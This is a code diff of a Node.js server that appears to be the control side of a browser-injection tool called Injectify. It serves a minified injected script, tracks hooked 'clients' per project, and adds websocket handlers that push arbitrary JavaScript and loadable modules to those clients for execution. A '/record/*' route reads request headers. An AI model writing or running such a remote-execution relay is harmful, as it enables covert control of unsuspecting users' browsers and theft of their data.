@@ -21,7 +21,7 @@ const app 	 		= express()
 const server 		= app.listen(config.express)
 const io 			= require('socket.io').listen(server)
 const sockjs		= require('sockjs')
-const injector		= sockjs.createServer()
+const injectServer	= sockjs.createServer()
 const path 			= require('path')
 const request 		= require('request')
 const {URL}			= require('url')
@@ -36,11 +36,25 @@ const reverse		= require('reverse-string')
 const escapeUTF8	= require('unicode-escape')
 const parseAgent	= require('user-agent-parser')
 const me			= require('mongo-escape').escape
+const injector		= require('./inject.js')
 
 const inject = {
-	core: 'injectify=' + UglifyJS.minify(fs.readFileSync('./inject/core.js', 'utf8')).code,
-	clients : []
+	core    		: UglifyJS.minify(fs.readFileSync('./inject/core.js', 'utf8')).code,
+	modules 		: {},
+	debugModules	: {},
+	clients			: []
 }
+
+injector.loadModules((modules, debugModules, count) => {
+	inject.modules = modules
+	inject.debugModules = debugModules
+	console.log(
+		chalk.greenBright('[inject:modules] ') +
+		chalk.yellowBright('successfully loaded ') +
+		chalk.magentaBright(count) +
+		chalk.yellowBright(' modules into memory')
+	)
+})
 
 console.log(chalk.greenBright("[Injectify] ") + "listening on port " + config.express)
 
@@ -948,11 +962,12 @@ MongoClient.connect(config.mongodb, function(err, db) {
 		})
 	})
 
-	injector.on('connection', socket => {
+	injectServer.on('connection', socket => {
 		let checkIfValid = socket => {
 			return new Promise((resolve, reject) => {
 				let project = socket.url.split('?')
 				project = project[project.length - 1]
+				if (project.charAt(0) == "$") project = project.substring(1)
 				if (!project) {
 					reject('websocket connection with invalid / missing project name, terminating')
 					return
@@ -965,9 +980,10 @@ MongoClient.connect(config.mongodb, function(err, db) {
 						if(doc == null) {
 							reject('websocket connection to nonexistent project, terminating')
 						} else {
+							console.log(socket)
 							resolve({
 								project : doc.name,
-								id      : + new Date()
+								id      : + new Date(),
 							})
 						}
 					})
@@ -1004,8 +1020,27 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				}
 				
 				on('e', data => { // error
-					//send('x', 'console.error("' + data.replace(/([/'"])/g, "/$1") + '")')
+					send('error', data)
 					console.log(data)
+				})
+
+				on('execute', data => { // execute
+					send('execute', data)
+				})
+
+				on('module', data => { // load a module
+					if (!data.name) return
+					let javascript = inject.modules[data.name]
+					if (javascript) {
+						try {
+							if (data.params) javascript = 'var module={name:' + JSON.stringify(data.name) + ',params:' + JSON.stringify(data.params) + '};' + javascript
+							send('module:' + data.name, javascript)
+						} catch (error) {
+							send('module:' + data.name, false)
+						}
+					} else {
+						send('module:' + data.name, false)
+					}
 				})
 
 				on('r', data => { // response
@@ -1018,7 +1053,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				})
 
 				on('d', data => { // data
-					send('x',
+					send('execute',
 						`/*injectify.listen('message', data => {
 							console.error(data)
 						})*/
@@ -1042,7 +1077,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 		})
 	})
 
-	injector.installHandlers(server, { prefix: '/inject' })
+	injectServer.installHandlers(server, { prefix: '/inject' })
 
 	app.get('/record/*', (req, res) => {
 		let headers = req.headers
